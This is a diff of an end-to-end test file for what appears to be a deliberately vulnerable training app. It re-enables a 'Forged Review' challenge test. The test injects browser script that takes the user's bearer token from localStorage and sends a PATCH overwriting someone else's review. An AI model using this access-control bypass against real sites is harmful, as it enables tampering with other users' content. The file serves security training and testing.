@@ -63,30 +63,39 @@ describe('/rest/product/reviews', () => {
   describe('challenge "Forged Review"', () => {
     protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })
 
-    let reviewId
-    beforeEach((done) => {
-      http.get(REST_URL + '/product/1/reviews', (res) => {
-        let body = ''
-
-        res.on('data', chunk => {
-          body += chunk
-        })
-
-        res.on('end', () => {
-          const response = JSON.parse(body)
-          reviewId = response.data[0]._id
-          done()
-        })
-      })
-    })
-
-    xit('should be possible to edit any existing review', () => {
+    it('should be possible to edit any existing review', () => {
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": "' + reviewId + '", "message": "injected" });')
+      // browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": "' + reviewId + '", "message": "injected" });')
+      browser.executeScript(() => {
+        var xhttp = new XMLHttpRequest()
+        xhttp.onreadystatechange = function () {
+          if (this.status === 200) {
+            const reviewId = JSON.parse(this.responseText).data[0]._id
+            editReview(reviewId)
+          }
+        }
+
+        xhttp.open('GET', 'http://localhost:3000/rest/product/1/reviews', true)
+        xhttp.setRequestHeader('Content-type', 'text/plain')
+        xhttp.send()
+
+        function editReview (reviewId) {
+          var xhttp = new XMLHttpRequest()
+          xhttp.onreadystatechange = function () {
+            if (this.status === 200) {
+              console.log('Success')
+            }
+          }
+          xhttp.open('PATCH', 'http://localhost:3000/rest/product/reviews', true)
+          xhttp.setRequestHeader('Content-type', 'application/json')
+          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
+          xhttp.send(JSON.stringify({'id': reviewId, 'message': 'injected'}))
+        }
+      })
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
-    // protractor.expect.challengeSolved({ challenge: 'Forged Review' })
+    protractor.expect.challengeSolved({ challenge: 'Forged Review' })
   })
 
   describe('challenge "Multiple Likes"', () => {
